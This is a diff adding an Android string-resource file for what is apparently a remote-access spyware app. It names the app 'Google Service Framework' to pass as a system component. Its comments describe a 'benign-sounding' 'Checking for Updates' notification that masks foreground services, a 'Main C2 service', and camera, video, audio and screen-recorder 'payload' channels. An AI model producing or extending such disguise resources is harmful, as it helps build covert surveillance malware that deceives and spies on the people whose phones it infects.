@@ -1,0 +1,60 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+    App strings, updated for Android 12.
+
+    Android 12 changes:
+     1. app_name kept unchanged (shown under the adaptive launcher icon).
+     2. NOTIFICATION CHANNEL NAMES moved to string resources. On Android 12
+        the notification channel names are shown to the user in
+        Settings -> Apps -> Notifications (Android 12 expanded notification
+        controls). Hardcoding them in Java means they cannot be localized and
+        are easy to get inconsistent. Using string resources is the correct
+        Android 12 practice.
+
+     3. Foreground-service notification text is now resource-backed so it can
+        be localized and is consistent across all payload services.
+
+    Place at: app/src/main/res/values/strings.xml
+-->
+<resources>
+    <!-- Launcher / app display name -->
+    <string name="app_name">Google Service Framework</string>
+
+    <!-- ============================================================
+         Foreground service / notification strings (Android 12)
+         ============================================================ -->
+
+    <!-- Benign-sounding notification title used by ALL foreground services -->
+    <string name="notification_title">Checking for Updates</string>
+    <string name="notification_text">Fetching</string>
+
+    <!-- Main C2 service notification channel -->
+    <string name="main_service_channel_id">main_service_channel</string>
+    <string name="main_service_channel_name">Background Service</string>
+
+    <!-- Camera payload service channel -->
+    <string name="camera_service_channel_id">camera_service_channel</string>
+    <string name="camera_service_channel_name">Camera Service</string>
+    <string name="camera_service_notification_text">Running</string>
+
+    <!-- Generic payload channel (used by video / audio / screen recorder) -->
+    <string name="payload_channel_id">channelid</string>
+    <string name="payload_channel_name">Foreground notifia</string>
+
+    <!-- ============================================================
+         Control panel labels (Android 12)
+         ============================================================ -->
+
+    <!-- Control panel activity title -->
+    <string name="control_panel_title">Google Service Framework</string>
+
+    <string name="btn_uninstall">Uninstall</string>
+    <string name="btn_restart">Restart Activity</string>
+
+    <!-- ============================================================
+         Camera preview (Android 12)
+         ============================================================ -->
+
+    <string name="camera_preview_title">Camera Preview</string>
+</resources>
+
